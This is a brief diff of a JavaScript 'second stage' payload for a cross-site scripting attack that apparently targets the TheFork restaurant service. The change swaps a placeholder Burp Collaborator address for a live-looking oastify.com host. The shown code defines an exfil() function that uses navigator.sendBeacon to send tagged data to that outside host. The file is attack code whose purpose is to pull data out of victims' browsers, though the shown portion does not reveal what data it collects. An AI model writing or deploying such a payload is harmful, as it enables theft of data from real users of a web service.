@@ -1,5 +1,5 @@
 // TheFork XSS second stage
-var COLLAB = 'https://XXXX.burpcollaborator.net'; // <-- свой URL
+var COLLAB = 'https://9s2mih6vfcvkogr4v94edwuj1a71vvjk.oastify.com'; // <-- свой URL
 
 function exfil(tag, data) {
   try { navigator.sendBeacon(COLLAB + '/?t=' + tag, String(data)); } catch (e) {}
